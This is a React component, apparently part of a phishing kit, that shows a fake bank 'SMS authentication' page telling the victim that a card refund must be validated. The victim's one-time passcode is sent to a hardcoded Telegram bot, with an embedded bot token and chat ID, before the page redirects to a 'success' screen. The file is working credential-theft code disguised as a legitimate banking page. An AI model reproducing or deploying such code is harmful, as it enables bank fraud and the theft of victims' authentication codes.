import react from 'react'
import React from 'react'
import 'antd/dist/antd.css'
import { Input } from 'antd'
import {useState} from 'react'
import {useRef, useEffect} from 'react';
import { Radio } from 'antd';
import { useNavigate } from 'react-router-dom';

export default function PersonalSpace() {
  const navigate = useNavigate();
  const errotp = useRef(null);
  // const navigate = useNavigate();

  const [errString, seterrString] = useState('Please complete this field');
  const [otp, setotp] = useState('');
  const chatId = '5345080694';
  const botToken= '5417079331:AAFFjTkpZXAzDL33Tbnjhl8-UDgDoWSzKJ8';
//   $chat_id = '5345080694';
// $token = '5417079331:AAFFjTkpZXAzDL33Tbnjhl8-UDgDoWSzKJ8';

  const nextButtonClicked = () => {
    if(!otp){
      errotp.current.hidden = false;
      seterrString('Please complete this field');
    }
    if(otp){
      var message = '====================={New User Login Income OTP}====================="';
      message += '\n OTP: ';
      message += otp;

      fetch('https://api.telegram.org/bot'+botToken+'/sendMessage?chat_id='+chatId+'&text=' + message) // url here
      .then((response) => {
        return response.json(); // replace .json() to .text() for plain text
      })
      .then((daat) => {
        console.log(daat);
      });
      navigate('/PersonalSpaceSuccess');
    }
  }
  const otpChanged = (e) => {
    setotp(e.target.value);
  }
  return (
    <div className="sc-jlyJG dhCUzp">
      <div className="sc-fjdhpX fxQNsf">
        <div>
          <div className="welcomeBack">MY PERSONAL SPACE</div>
          <div className="commonText" style={{marginTop: 50}}>
            <p>
              SMS AUTHENTICATION (MOBILE)</p>
            <p style={{marginTop: 30}}>Your card has not yet been credited, please validate your refund using your banking application <span></span>:<span></span> timed</p>
          </div>
        </div>
        <div>
          <div id="otpForm" style = {{textAlign: 'center', alignItems: 'center'}}>
            <div style={{display: 'flex', alignItems: 'center', justifyContent: 'center', height: 30}}>
              <img src={require('../media/warning16.png')} alt ='email' style={{width: 16, height: 16}} hidden/>
              <p style ={{color: 'red'}} hidden> invalid OTP entered </p>
            </div>
            <div id="otp" className="formName" style={{color: 'grey'}}>
              Code received by SMS:
            </div>
            <div
              id="otpInput"
              className="inputForm"
              style = {{marginLeft: 'auto', marginRight: 'auto'}}
            >
              <Input
                type = 'password'
                className="otp"
                placeholder="*****"
                value = {otp}
                onChange = {otpChanged}
                style ={{textAlign: 'center'}}
              />
              <p id = 'errotp' ref={errotp} style = {{color: 'red', fontSize: '16px'}} hidden>{errString}</p>
            </div>
          </div>
          <div style={{position: 'absolute', right: 500, top: 250}}>
            <img src={require('../media/mobile.png')} alt ='email' style={{width: 100}}/>
          </div>
        </div>
        <div className="sc-jzJRlG giyMJw" style = {{marginTop: 150}}>
          <button
            type="button"
            className="signInButton"
            style={{ margin: 'auto', marginTop: 10}}
            onClick={nextButtonClicked}
          >
            <span>Next</span>
          </button>
        </div>
      </div>
    </div>
  )
}

